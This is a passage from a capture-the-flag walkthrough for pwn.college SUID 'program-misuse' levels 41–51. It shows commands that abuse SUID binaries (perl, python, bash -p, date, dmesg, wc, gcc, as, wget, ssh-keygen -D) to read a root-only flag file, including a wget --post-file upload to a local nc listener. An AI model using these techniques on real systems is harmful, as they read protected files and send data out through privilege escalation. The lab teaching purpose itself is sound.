hacker@program-misuse~level41:/$ /challenge/babysuid_level41 
Welcome to /challenge/babysuid_level41!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/perl.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level41) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/perl!
```

Perl is a scripting language. As such, ew can use the following script to read the `/flag`.

```perl
open(fh, "/flag");
$firstline = <fh>;
print "$firstline\n";
```

We have to use the `perl` utility to execute the script.

```
hacker@program-misuse~level41:~$ perl babysuid41.pl
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
        LANGUAGE = (unset),
        LC_ALL = (unset),
        LC_CTYPE = "C.UTF-8",
        LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
pwn.college{ECuRXGknACrZJVi8_w0qX60_EeN.01M4EDL4ITM0EzW}
```

&nbsp;

## level 42

```
hacker@program-misuse~level42:/$ /challenge/babysuid_level42 
Welcome to /challenge/babysuid_level42!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/python.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level42) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/python!
```

Python is a scripting language. As such, we can use the following script to read the `/flag`.

```python
with open("/flag", "r") as flag:
    print(flag.read())
```

We have to use the `python` utility to execute the script.

```
hacker@program-misuse~level42:~$ python babysuid42.py
pwn.college{s0XtPzYVFXtT1tQ-IdvZxhZM8d6.0FN4EDL4ITM0EzW}
```

&nbsp;

## level 43

```
hacker@program-misuse~level43:/$ /challenge/babysuid_level43 
Welcome to /challenge/babysuid_level43!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/ruby.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level43) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/ruby!
```

Ruby is a scripting language. As such, we can use the following script to read the `/flag`.

```ruby
fileObject = File.open("/flag","r");
print(fileObject.read());
fileObject.close();
```

We have to use the `ruby` utility to execute the script.

```
hacker@program-misuse~level43:~$ ruby babysuid43.rb 
pwn.college{s56sho2vlj9p-Sf15svFloGYQW4.0VN4EDL4ITM0EzW}
```

&nbsp;

## level 44

```
hacker@program-misuse~level44:/$ /challenge/babysuid_level44 
Welcome to /challenge/babysuid_level44!

This challenge is part of a series of programs that
let you read the flag because they let you program anything.

I just set the SUID bit on /usr/bin/bash.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level44) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/bash!
```

Bash is a scripting language. As such, we can use the following script to read the `/flag`.

```bash
cat /flag
```

We have to use the `bash` along with the `-p` option to execute the script.

```
hacker@program-misuse~level44:~$ bash -p babysuid44.sh 
pwn.college{QEuZLuuRJEooZKOqim6yd5k2dvS.0lN4EDL4ITM0EzW}
```

&nbsp;

## level 45

```
hacker@program-misuse~level45:/$ /challenge/babysuid_level45 
Welcome to /challenge/babysuid_level45!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/date.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level45) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/date!
```

The `date` utility displays the current time.

If we provide the `/flag` file to `date`, it prints out the flag within the error message.

```
hacker@program-misuse~level45:/$ date -f /flag
date: invalid date 'pwn.college{cWNNY2O6pysXW2u0FdY6K-vcSTX.01N4EDL4ITM0EzW}'
```

&nbsp;

## level 46

```
hacker@program-misuse~level46:/$ /challenge/babysuid_level46 
Welcome to /challenge/babysuid_level46!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/dmesg.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level46) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg!
```

`dmesg` is used to examine or control the kernel ring buffer.

We can use the `-F` option to specify a file to read from.

```
hacker@program-misuse~level46:/$ dmesg -F /flag
[    0.000000] pwn.college{YGTV9O0r_S-_OuWtaP9_xp9U5nY.0FO4EDL4ITM0EzW}
```

&nbsp;

## level 47

```
hacker@program-misuse~level47:/$ /challenge/babysuid_level47 
Welcome to /challenge/babysuid_level47!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/wc.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level47) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wc!
```

The `wc` command is used for word counting.

We can use the `--files0-from` option such that the flag is printed out in the error message.

```
hacker@program-misuse~level47:/$ wc --files0-from=/flag
wc: 'pwn.college{QbLYiqiNpJDh7KI3YvvaTqt1r7X.0VO4EDL4ITM0EzW}'$'\n': No such file or directory
```

&nbsp;

## level 48

```
hacker@program-misuse~level48:/$ /challenge/babysuid_level48 
Welcome to /challenge/babysuid_level48!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/gcc.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level48) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/gcc!
```

The `gcc` utility is used for preprocessing, compilation, assembly and linking files.

Let us write a simple C script.

```c
#include </flag>

int main {
	puts("Hello");
}
```

Since we are including `/flag`, which we do not have access to the compilation is going to result in an error. However, within the error messages, we can read the flag.

```
hacker@program-misuse~level48:~$ gcc -L / babysuid48.c
In file included from babysuid48.c:1:
/flag:1:4: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘.’ token
    1 | pwn.college{koBPlBAFGwgpjWl16bcloin4uZA.0FM5EDL4ITM0EzW}
      |    ^
/flag:1:40: error: invalid suffix "FM5EDL4ITM0EzW" on floating constant
    1 | pwn.college{koBPlBAFGwgpjWl16bcloin4uZA.0FM5EDL4ITM0EzW}
      |                                        ^~~~~~~~~~~~~~~~
babysuid48.c:3:10: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘{’ token
    3 | int main {
      |  
```

&nbsp;

## level 49

```
hacker@program-misuse~level49:/$ /challenge/babysuid_level49 
Welcome to /challenge/babysuid_level49!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/as.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level49) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/as!
```

The `as` utility is an assembler for programming languages.

```
hacker@program-misuse~level49:/$ as /flag 
/flag: Assembler messages:
/flag:1: Error: no such instruction: `pwn.college{0VD3s7ehT8Yllr4jwhBNM4dN-v1.0VM5EDL4ITM0EzW}'
```

&nbsp;

## level 50

```
hacker@program-misuse~level50:/$ /challenge/babysuid_level50 
Welcome to /challenge/babysuid_level50!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/wget.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level50) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
```

Let us set up a `nc` listener. 

```
hacker@program-misuse~level50:/$ nc -nlvp 80
Listening on 0.0.0.0 80
```

```
hacker@program-misuse~level50:/$ wget --post-file=/flag http://localhost
--2024-05-21 16:00:46--  http://localhost/
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:80... failed: Connection refused.
Connecting to localhost (localhost)|127.0.0.1|:80... connected.
HTTP request sent, awaiting response... 
```

```
hacker@program-misuse~level50:/$ nc -nlvp 80
Listening on 0.0.0.0 80
Connection received on 127.0.0.1 54618
POST / HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: localhost
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

pwn.college{gzrliiugDwjQ9GQK3JnndBJ1Vh9.0lM5EDL4ITM0EzW}
```

&nbsp;

## level 51

```c
include <stdio.h>

int C_GetFunctionList()
{
        FILE *fptr;
        fptr = fopen("/flag", "r");
        char myString[100];
        fgets(myString, 100, fptr);
        printf("%s", myString);
        fclose(fptr);
}

int main()
{
        puts("Hello");
}
```

```
hacker@program-misuse~level51:~$ gcc babysuid51.c -o babysuid51 -shared -no-pie
```

```
hacker@program-misuse~level51:~$ ssh-keygen -D ./babysuid51
```
